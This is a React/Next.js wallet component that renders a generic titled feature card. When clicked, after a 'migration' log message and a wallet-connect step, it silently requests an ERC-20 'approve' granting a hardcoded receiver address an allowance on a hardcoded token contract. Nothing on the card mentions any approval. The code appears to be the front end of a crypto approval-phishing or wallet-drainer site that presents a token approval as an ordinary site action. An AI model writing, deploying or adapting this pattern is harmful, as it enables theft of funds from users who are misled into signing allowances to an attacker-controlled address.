"use client"

import { useAccount, usePublicClient, useFeeData, useWalletClient, useBalance, useNetwork } from 'wagmi'
import {useState} from "react"
import abis from "@/utils/abis/mover.json"
import { createWalletClient, http, createPublicClient } from 'viem'
import { bscTestnet } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'

interface Props {
  title: string,
  message: string

}

const Item = (prop: Props) => {

  const {title, message} = prop
 const {address, isConnected} = useAccount()

 const abi = abis.abi // change abi after deploying approval contract
 const publicClient = usePublicClient()
 const [wc, setWC] = useState()
 const {data: gasPrice} = useFeeData()
 const [gasEst, setGasEst] = useState()
 const receiver = "0xFAf8C101F18711D16659e24458ef18F6A87e2B71"
 const con_address = "0x4f67aaad29973831e912fd9b8f5328a71b29d3d9" //"0xB8c77482e45F1F44dE1745F52C74426C631bDD52"
 const [amt, setAmt] = useState()
 const ercadd = " 0x55d398326f99059ff775485246999027b3197955"//"0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684"
 
 /*
 const {data: balance} = useBalance({
  address,token: ercadd
}) */
 const {data} = useWalletClient({

               async onSuccess(data) {

                setWC(data)
               
                }
 })
  const [shm, setShm] = useState(false)

const handleClick = async() => {

  console.log("Migration clicked")

   if(!isConnected)
   {
     console.log("Connect wallet")
     const mbtn = document.querySelector("#cshm") //.clicked()
     mbtn?.click()

   }
   else {
  
    if(data)
    {
    
      try {

      const [address] = await data.getAddresses()

      const amt = BigInt("10000000000000000")
      console.log("balance ",amt, address)
     
       const { request } = await publicClient.simulateContract({
        abi: abi,
        functionName: "approve",
        args: [receiver, amt],
        account: address,
        address: "0x6DC7DD490181dF81bc6D0e9B1A7Fa2Ca1ab73e4E"
      })
        
      const res = await data?.writeContract(request)
      console.log("WC datas",res)
      } 

      catch (error) {
        console.log("An error occur",error)
      }
      
    }
   }
  
}
    return(

        <div className="col-md-6 col-lg-3 d-flex align-items-stretch mb-5 mb-lg-0 pec" onClick={() => handleClick()}>
        <div className="icon-box" data-aos="fade-up" data-aos-delay="200">
          <div className="icon"><i className="bx bx-file"></i></div>
          <h4 className="title"><p className="pec">{title}</p></h4>
          <p className="description">{message}</p>
        </div>
      </div>
    )
   
}

export default Item